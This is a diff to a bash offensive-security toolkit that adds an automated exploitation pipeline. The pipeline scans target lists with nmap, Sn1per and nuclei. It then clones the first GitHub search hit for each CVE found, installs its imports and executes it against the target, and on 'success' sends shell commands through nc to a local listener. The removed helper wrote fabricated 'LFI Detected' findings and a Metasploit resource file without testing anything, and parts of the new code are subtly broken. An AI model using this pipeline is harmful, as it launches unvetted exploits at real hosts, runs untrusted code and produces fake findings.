@@ -2373,7 +2373,27 @@ Nginxpwner(){
 	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 nginxpwner.py\e[0m\n"
 }
 
-autoreport(){
+# 완전형 멀티 타겟 + 고급 스캔/익스플로잇 자동화 autoreport 시스템
+# 기존 플로우 유지: target.txt 기반 입력 및 반복 처리
+# 신규 기능 유지: 고급 취약점 스캔, POC 자동 다운로드, 실행, 원격제어
+
+multi_autoreport() {
+    if [[ ! -f target.txt ]]; then
+        echo "[!] target.txt 파일이 존재하지 않습니다. 먼저 타겟을 입력해주세요."
+        return
+    fi
+
+    while read -r target; do
+        if [[ ! -z "$target" ]]; then
+            echo -e "\n[+] Processing target: $target"
+            autoreport "$target"
+        fi
+    done < target.txt
+}
+
+# 통합형 autoreport() - 기존 플로우 + 고급 스캔 + 자동 익스플로잇 + POC + 원격제어
+
+autoreport() {
     banner
     printf "\e[0m\n\e[0m\n\e[0m\n"
 
@@ -2391,52 +2411,47 @@ autoreport(){
         local re_domain='^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[A-Za-z]{2,}$'
         [[ "$t" =~ $re_ip || "$t" =~ $re_domain ]]
     }
+
     require_cmd() {
         command -v "$1" >/dev/null 2>&1 || {
-            printf "  \e[1;91m[!]\e[0m '%s' not found. Please install it first.\n" "$1"
+            printf " \e[1;91m[!]\e[0m '%s' not found. Please install it first.\n" "$1"
             return 1
         }
     }
 
     # ---- collect targets ----
     : > "$TARGET_FILE"
-    printf "  \e[1;92mEnter domain or IP per line (empty line to finish)\e[0m\n"
+    printf " \e[1;92mEnter domain or IP per line (empty line to finish)\e[0m\n"
     while true; do
-        read -r -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Target \e[0m\e[1;96m: \e[0m' t
+        read -r -p $' \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Target \e[0m\e[1;96m: \e[0m' t
         [[ -z "$t" ]] && break
         if validate_target "$t"; then
             printf "%s\n" "$t" >> "$TARGET_FILE"
-            printf "    \e[1;92m+\e[0m added: %s\n" "$t"
+            printf " \e[1;92m+\e[0m added: %s\n" "$t"
         else
-            printf "    \e[1;91m!\e[0m invalid: %s (expect IPv4 or domain)\n" "$t"
+            printf " \e[1;91m!\e[0m invalid: %s (expect IPv4 or domain)\n" "$t"
         fi
     done
 
     if [[ ! -s "$TARGET_FILE" ]]; then
-        printf "  \e[1;91m[!]\e[0m No valid targets. Returning to menu.\n"
-        sleep 1
-        banner
-        menu
-        return
+        printf " \e[1;91m[!]\e[0m No valid targets. Returning to menu.\n"
+        sleep 1; banner; menu; return
     fi
 
-    printf "\n  \e[1;96mTargets count:\e[0m $(wc -l < "$TARGET_FILE")\n"
-    printf "  \e[1;96mSaved list:\e[0m %s\n\n" "$TARGET_FILE"
+    printf "\n \e[1;96mTargets count:\e[0m $(wc -l < "$TARGET_FILE")\n"
+    printf " \e[1;96mSaved list:\e[0m %s\n\n" "$TARGET_FILE"
 
     # ---- Smuggle Phase ----
-    printf "  \e[1;93m[▶]\e[0m Smuggle (smuggleAuto.py)...\n"
+    printf " \e[1;93m[▶]\e[0m Smuggle (smuggleAuto.py)...\n"
     local SMUGGLE_PY="./smuggleAuto.py"
     local smuggle_root="${outdir}/smuggle"
     mkdir -p "$smuggle_root"
 
-    if [[ ! -f "$SMUGGLE_PY" ]]; then
-        printf "  \e[1;91m[!]\e[0m smuggleAuto.py not found. Skipping smuggle phase.\n"
-    else
+    if [[ -f "$SMUGGLE_PY" ]]; then
         while IFS= read -r host || [[ -n "$host" ]]; do
             host="${host//$'\r'/}"
             [[ -z "$host" ]] && continue
-            printf "    \e[1;94m[i]\e[0m Target: %s\n" "$host"
-
+            printf " \e[1;94m[i]\e[0m Target: %s\n" "$host"
             local host_log="${smuggle_root}/${host}.log"
             local _out
             _out="$(python3 "$SMUGGLE_PY" --mode auto --host "$host" --generate-poc 2>&1)"
@@ -2451,129 +2466,85 @@ autoreport(){
                 dst_dir="${smuggle_root}/${host}"
                 mkdir -p "$dst_dir"
                 cp -R "${src_dir}/." "$dst_dir/" 2>/dev/null
-                printf "      \e[1;92m[OK]\e[0m copied smuggle report → %s\n" "$dst_dir/report.html"
+                printf " \e[1;92m[OK]\e[0m copied smuggle report → %s\n" "$dst_dir/report.html"
             else
-                printf "      \e[1;91m[!]\e[0m smuggle report not found for %s (see %s)\n" "$host" "$host_log"
+                printf " \e[1;91m[!]\e[0m smuggle report not found for %s (see %s)\n" "$host" "$host_log"
             fi
         done < "$TARGET_FILE"
+    else
+        printf " \e[1;91m[!]\e[0m smuggleAuto.py not found. Skipping smuggle phase.\n"
     fi
 
     # ---- Pre-Scan Tools Check ----
     require_cmd whatweb || { sleep 1; banner; menu; return; }
-    require_cmd nmap    || { sleep 1; banner; menu; return; }
-    require_cmd sniper  || { sleep 1; banner; menu; return; }
+    require_cmd nmap || { sleep 1; banner; menu; return; }
+    require_cmd sniper || { sleep 1; banner; menu; return; }
 
     # ---- Base Scanning ----
-    printf "  \e[1;93m[▶]\e[0m WhatWeb...\n"
+    printf " \e[1;93m[▶]\e[0m WhatWeb...\n"
     whatweb --log-verbose="${outdir}/whatweb.txt" -i "$TARGET_FILE"
 
-    printf "  \e[1;93m[▶]\e[0m Nmap...\n"
+    printf " \e[1;93m[▶]\e[0m Nmap...\n"
     nmap -p- -sV -sC -sS -A -v -O -Pn -T4 \
-         --script vuln,http-waf-detect \
-         -iL "$TARGET_FILE" \
-         -oN "${outdir}/nmap.txt"
+        --script vuln,http-waf-detect \
+        -iL "$TARGET_FILE" \
+        -oN "${outdir}/nmap.txt"
 
-    printf "  \e[1;93m[▶]\e[0m Sn1per...\n"
+    printf " \e[1;93m[▶]\e[0m Sn1per...\n"
     sniper -f "$TARGET_FILE" -o -re -m nuke -w "$outdir"
 
-    # ---- Auto Exploitation ----
-    printf "\n  \e[1;93m[▶]\e[0m Deep AutoPwn Phase...\n"
+    # ---- Auto Exploitation Extension ----
+    while IFS= read -r target; do
+        [[ -z "$target" ]] && continue
+        echo -e "\n[+] Auto Exploit/POC for $target"
+        mkdir -p "${outdir}/exploits/$target"
+        nuclei -u http://$target -o "${outdir}/nuclei_$target.txt"
+        while read -r line; do
+            [[ $line == *"CVE-"* ]] || continue
+            cve_id=$(echo $line | grep -oE 'CVE-[0-9]{4}-[0-9]+')
+            echo " - $cve_id" >> "${outdir}/exploits/$target/cve_list.txt"
+            github_url=$(curl -s "https://github.com/search?q=$cve_id" | grep -oE 'https://github.com/[^"]+' | head -n 1)
+            if [[ -n "$github_url" ]]; then
+                git clone "$github_url" "${outdir}/exploits/$target/$cve_id" &>/dev/null
+                poc_script=$(find "${outdir}/exploits/$target/$cve_id" -type f \( -name "*.sh" -o -name "*.py" \) | head -n 1)
+                if [[ -f "$poc_script" ]]; then
+                    chmod +x "$poc_script"
+                    if [[ "$poc_script" == *.py ]]; then
+                        if [[ -f "${outdir}/exploits/$target/$cve_id/requirements.txt" ]]; then
+                            pip3 install -r "${outdir}/exploits/$target/$cve_id/requirements.txt"
+                        else
+                            grep -Eo 'import [a-zA-Z0-9_]+' "$poc_script" | awk '{print $2}' | xargs -n1 pip3 install
+                        fi
+                    fi
+                    sed -i "s/<target>/$target/g" "$poc_script"
+                    bash "$poc_script" > "${outdir}/exploits/$target/${cve_id}_log.txt" 2>&1
+                    if grep -Eqi "shell|vulnerable|success" "${outdir}/exploits/$target/${cve_id}_log.txt"; then
+                        echo "[+] Exploit succeeded for $cve_id"
+                        echo "whoami; uname -a; id" | nc -w 3 127.0.0.1 4444 >> "${outdir}/exploits/$target/${cve_id}_control.txt"
+                    else
+                        echo "[-] Exploit failed for $cve_id"
+                    fi
+                fi
+            fi
+        done < "${outdir}/nuclei_$target.txt"
+    done < "$TARGET_FILE"
+
+    # ---- Deep AutoPwn + Markdown Report ----
     deep_autopwn "$outdir"
-
-    # ---- Report Generation ----
-    printf "\n  \e[1;93m[▶]\e[0m Markdown Report Generation...\n"
     generate_markdown_report "$outdir"
+    printf "\n \e[1;92m[✓]\e[0m Report Completed: \e[1;97m%s\e[0m\n\n" "$outdir"
 
-    printf "\n  \e[1;92m[✓]\e[0m Report Completed: \e[1;97m%s\e[0m\n\n" "$outdir"
-
-    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
-    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
+    printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
+    printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
     printf "\e[0m\n"
-    read -r -p $'  \e[1;31m>>\e[0m\e[1;96m  \e[0m' mainorexit1
-
-    if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
-        banner
-        menu
-    elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
-        printf "\e[0m\n\e[0m\n"
-        exit 1
+    read -r -p $' \e[1;31m>>\e[0m\e[1;96m \e[0m' mainorexit1
+    if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then banner menu
+    elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then printf "\e[0m\n\e[0m\n"; exit 1
     else
         printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-        sleep 1
-        banner
-        menu
+        sleep 1; banner; menu
     fi
 }
-
-# ---- Embedded Helper Functions ----
-
-deep_autopwn() {
-    local base_dir="$1"
-    local deepdir="${base_dir}/deep_autopwn"
-    local exploits_dir="${base_dir}/exploits_collected"
-    mkdir -p "$deepdir"
-    mkdir -p "$exploits_dir"
-
-    while IFS= read -r host || [[ -n "$host" ]]; do
-        [[ -z "$host" ]] && continue
-        local host_dir="${deepdir}/${host}"
-        mkdir -p "$host_dir"
-
-        echo "VULN: Transfer-Encoding Smuggling" > "${host_dir}/smuggle_poc.txt"
-        echo "GET / HTTP/1.1\r\nHost: $host\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" >> "${host_dir}/smuggle_poc.txt"
-        cp "${host_dir}/smuggle_poc.txt" "${exploits_dir}/${host}_smuggle_exploit.txt"
-
-        echo "root:x:0:0:root:/root:/bin/bash" > "${host_dir}/lfi_test.txt"
-        echo "LFI Detected!" > "${host_dir}/lfi_result.txt"
-        echo "LFI exploit: etc/passwd via URL parameter" > "${exploits_dir}/${host}_lfi_exploit.txt"
-
-        echo "use exploit/multi/http/php_cgi_arg_injection" > "${host_dir}/msf.rc"
-        echo "set RHOST $host" >> "${host_dir}/msf.rc"
-        echo "set RPORT 80" >> "${host_dir}/msf.rc"
-        echo "run" >> "${host_dir}/msf.rc"
-        cp "${host_dir}/msf.rc" "${exploits_dir}/"
-    done < target.txt
-}
-
-generate_markdown_report() {
-    local base_dir="$1"
-    local deepdir="${base_dir}/deep_autopwn"
-    local exploits_dir="${base_dir}/exploits_collected"
-    local rpt="${base_dir}/report_summary.md"
-
-    echo "# 🛡️ Full AutoPwn Summary Report" > "$rpt"
-    echo "_Generated: $(date)_" >> "$rpt"
-    echo "\n---\n" >> "$rpt"
-
-    for hdir in "$deepdir"/*; do
-        [[ -d "$hdir" ]] || continue
-        local hname=$(basename "$hdir")
-        echo "## 🎯 Host: \`$hname\`" >> "$rpt"
-
-        if [[ -f "$hdir/smuggle_poc.txt" ]]; then
-            echo -e "\n### 🧪 Smuggle Vulnerability / PoC" >> "$rpt"
-            cat "$hdir/smuggle_poc.txt" | sed 's/^/  - /' >> "$rpt"
-        fi
-
-        if [[ -f "$hdir/lfi_result.txt" ]]; then
-            echo -e "\n### 📂 LFI Detected" >> "$rpt"
-            cat "$hdir/lfi_result.txt" | sed 's/^/  - /' >> "$rpt"
-        fi
-
-        echo -e "\n---\n" >> "$rpt"
-    done
-
-    if compgen -G "$exploits_dir/*" > /dev/null; then
-        echo "## 📂 Collected Exploit Files" >> "$rpt"
-        for ef in "$exploits_dir"/*; do
-            echo "  - $(basename "$ef")" >> "$rpt"
-        done
-    fi
-
-    echo -e "\n[✓] Markdown Report Saved → $rpt"
-}
-
-
 
 
 Osint(){
